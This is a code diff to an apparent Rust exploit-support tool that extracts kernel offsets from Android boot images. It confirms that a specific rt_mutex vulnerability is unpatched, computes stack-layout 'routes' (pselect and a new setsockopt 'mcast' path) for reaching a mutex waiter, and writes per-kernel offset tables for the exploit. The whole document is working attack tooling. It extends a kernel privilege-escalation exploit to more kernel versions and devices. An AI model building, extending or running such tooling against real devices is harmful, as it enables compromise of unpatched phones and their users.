@@ -8,8 +8,8 @@ use clap::Parser;
 use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
-    PSELECT_ROUTE_NFDS, derive_nf_logger_registration, derive_pselect_layout,
-    ensure_rtmutex_43499_unpatched, relative_symbols,
+    McastLayout, PSELECT_ROUTE_NFDS, derive_mcast_layout, derive_nf_logger_registration,
+    derive_pselect_layout, ensure_rtmutex_43499_unpatched, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
 use ghostlock_extract::fdt::recover_kernel_phys_load;
@@ -36,6 +36,10 @@ struct Cli {
     /// optional XBL xbl_config.img; derive kernel physical load from its FDT
     #[arg(long)]
     xbl_config: Option<PathBuf>,
+    /// BTF blob from a reference vmlinux of the same KMI, for images that
+    /// carry no embedded BTF
+    #[arg(long)]
+    btf: Option<PathBuf>,
     /// kernel physical load address (hex or decimal); overrides defaults
     #[arg(long, value_parser = parse_int)]
     phys: Option<u64>,
@@ -247,12 +251,16 @@ fn run(cli: &Cli) -> Result<i32> {
         }
     }
 
-    let btf_raw = btf_at.as_ref().map(|(_, blob)| blob.clone());
+    let btf_raw = match &cli.btf {
+        Some(path) => Some(std::fs::read(path)?),
+        None => btf_at.as_ref().map(|(_, blob)| blob.clone()),
+    };
     let btf = btf_raw.as_deref().map(Btf::new).transpose()?;
     if btf.is_none() {
         eprintln!(
-            "warning: embedded BTF not found; symbols come from kallsyms \
-             and struct offsets fall back to target.h defaults"
+            "warning: embedded BTF not found and no --btf override; symbols \
+             come from kallsyms and struct offsets fall back to target.h \
+             defaults"
         );
     }
 
@@ -262,9 +270,9 @@ fn run(cli: &Cli) -> Result<i32> {
             if kernel_struct_macro(Some(release)).is_none() {
                 eprintln!(
                     "warning: {release} is not a verified kernel family \
-                     (6.1, 6.6, 6.12); emitting the 6.6 layout as a testing \
-                     starting point, verify the waiter layout and slab \
-                     stride before trusting it"
+                     (5.10, 5.15, 6.1, 6.6, 6.12); emitting the 6.6 layout as a \
+                     testing starting point, verify the waiter layout and \
+                     slab stride before trusting it"
                 );
             }
         }
@@ -306,6 +314,8 @@ fn run(cli: &Cli) -> Result<i32> {
     let mut symbol_offsets = resolve_symbols(&symbols, base);
 
     let mut derived: BTreeMap<String, u64> = BTreeMap::new();
+    let mut mcast: Option<McastLayout> = None;
+    let mut pselect_infeasible = false;
     if !cli.no_disasm {
         if let Some(btf) = &btf {
             match derive_pselect_layout(
@@ -334,18 +344,26 @@ fn run(cli: &Cli) -> Result<i32> {
                     .collect();
                     eprintln!(
                         "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
-                         shift={shift} (derived {} - 2)",
+                         shift={shift} waiter_off={:#x} (derived {} - 2)",
                         layout.chain,
                         frame_parts.join(" "),
                         layout.pselect_buffer,
                         layout.waiter_local,
+                        layout.waiter_off,
                         layout.shift,
                     );
                     derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
+                    derived.insert(
+                        "pselect_waiter_off_value".to_string(),
+                        layout.waiter_off as u64,
+                    );
                 }
                 Err(ExtractError::Infeasible(message)) => {
-                    eprintln!("error: pselect route not feasible on this kernel: {message}");
-                    return Ok(3);
+                    // record the refusal instead of aborting: the profile may
+                    // still have a feasible route and the picker needs the
+                    // remaining windows stamped
+                    eprintln!("warning: pselect route not feasible on this kernel: {message}");
+                    pselect_infeasible = true;
                 }
                 Err(err) => {
                     eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
@@ -361,6 +379,41 @@ fn run(cli: &Cli) -> Result<i32> {
                 }
                 Err(err) => {
                     eprintln!("warning: loggers_0_1 derivation failed: {err}");
+                }
+            }
+            // derive mcast for every release: its copy window may fit on
+            // non-5.15 kernels too, and the route picker stamps each route
+            // independently so the user can force any feasible one
+            match derive_mcast_layout(&boot.kernel, &rel_symbols, &sorted_offsets, btf) {
+                Ok(layout) => {
+                    let frame_parts: Vec<String> = [
+                        "frame_setsockopt_wrapper",
+                        "frame_setsockopt_syscall",
+                        "frame_setsockopt_ops",
+                        "frame_setsockopt_proto",
+                        "frame_setsockopt_handler",
+                    ]
+                    .iter()
+                    .filter_map(|key| {
+                        layout.frames.get(*key).map(|value| {
+                            format!("{}={:#x}", key.split('_').nth(2).unwrap_or(key), value)
+                        })
+                    })
+                    .collect();
+                    eprintln!(
+                        "info: mcast chain {} frames={} buffer=sp+{:#x} (svc{}) \
+                         waiter=svc{} waiter_off={:#x}",
+                        layout.chain,
+                        frame_parts.join(" "),
+                        layout.buffer_local,
+                        layout.buffer_depth,
+                        layout.waiter_depth,
+                        layout.waiter_off,
+                    );
+                    mcast = Some(layout);
+                }
+                Err(err) => {
+                    eprintln!("warning: mcast stamp derivation failed: {err}");
                 }
             }
         } else {
@@ -385,6 +438,32 @@ fn run(cli: &Cli) -> Result<i32> {
             );
             shift
         });
+    // No measurement at all keeps the structural default (0); only a
+    // measured negative distance proves pselect cannot reach the waiter.
+    let pselect_waiter_off = if pselect_infeasible {
+        -1
+    } else {
+        derived
+            .get("pselect_waiter_off_value")
+            .map(|value| *value as i64)
+            .unwrap_or(0)
+    };
+    let mcast_fits = mcast.as_ref().is_some_and(|layout| {
+        layout.waiter_off as u64 + layout.lock_offset + 8 <= layout.buffer_size
+    });
+    if pselect_waiter_off < 0 && !mcast_fits {
+        let detail = match &mcast {
+            Some(layout) => format!(
+                "pselect cannot reach the waiter and the mcast buffer misses it too \
+                 (waiter_off={:#x} + lock {:#x} + 8 > buffer {})",
+                layout.waiter_off, layout.lock_offset, layout.buffer_size
+            ),
+            None => "pselect cannot reach the waiter and no mcast stamp was derived"
+                .to_string(),
+        };
+        eprintln!("error: no feasible route on this kernel: {detail}");
+        return Ok(3);
+    }
     if let Some(slot) = derived.get("off_slide_loggers_0_1").copied() {
         symbol_offsets.insert("off_slide_loggers_0_1".to_string(), Some(slot));
     }
@@ -429,12 +508,19 @@ fn run(cli: &Cli) -> Result<i32> {
         }
     }
     report::require_fields(&symbol_offsets, &BTreeSet::new())?;
-    if btf.is_some() {
+    if let Some(btf) = btf.as_ref() {
+        let mut optional: BTreeSet<&str> = BTreeSet::new();
+        // Only the 5.10 family's flat waiter lacks these two. Reading it off
+        // the blob alone would let a wake_state-less reference through on a
+        // kernel whose waiter does have one, which is the wrong KMI.
+        if kernel_struct_macro(release.as_deref()) == Some("STRUCT_OFFSETS_5_10") {
+            optional.extend(["waiter_wake_state", "waiter_ww_ctx"]);
+        }
         let struct_fields_u64: BTreeMap<String, Option<u64>> = struct_offsets
             .iter()
             .map(|(key, value)| (key.clone(), value.map(|v| v as u64)))
             .collect();
-        report::require_fields(&struct_fields_u64, &BTreeSet::new())?;
+        report::require_fields(&struct_fields_u64, &optional)?;
     }
     if let Some(mm_size) = struct_offsets.get("struct_mm_struct").copied().flatten() {
         eprintln!(
@@ -454,7 +540,7 @@ fn run(cli: &Cli) -> Result<i32> {
         };
         let key = report::kernel_key(release);
         if report::existing_entries().contains_key(release) && !cli.force {
-            report::warn_existing_mismatches(release, &symbol_offsets);
+            report::warn_existing_mismatches(release, &symbol_offsets, mcast.as_ref());
             if report::kernel_header_path(&key).exists() {
                 eprintln!("info: {release} already registered; no duplicate table created");
                 return Ok(0);
@@ -466,6 +552,8 @@ fn run(cli: &Cli) -> Result<i32> {
             &struct_offsets,
             kernel_phys_load,
             pselect_shift,
+            pselect_waiter_off,
+            mcast.as_ref(),
         );
         let target = report::kernel_header_path(&key);
         if target.exists()
@@ -484,7 +572,7 @@ fn run(cli: &Cli) -> Result<i32> {
         std::fs::write(&target, output).map_err(|err| ExtractError::new(format!("{err}")))?;
         eprintln!("wrote {}", target.display());
         report::register_kernel(&key)?;
-        report::warn_existing_mismatches(release, &symbol_offsets);
+        report::warn_existing_mismatches(release, &symbol_offsets, mcast.as_ref());
         return Ok(0);
     }
 
@@ -496,6 +584,8 @@ fn run(cli: &Cli) -> Result<i32> {
             &struct_offsets,
             kernel_phys_load,
             pselect_shift,
+            pselect_waiter_off,
+            mcast.as_ref(),
         )
     } else {
         let report_value = report::build_report(
@@ -506,6 +596,8 @@ fn run(cli: &Cli) -> Result<i32> {
             &struct_offsets,
             btf_size,
             pselect_shift,
+            pselect_waiter_off,
+            mcast.as_ref(),
         );
         serde_json::to_string_pretty(&report_value).unwrap() + "\n"
     };
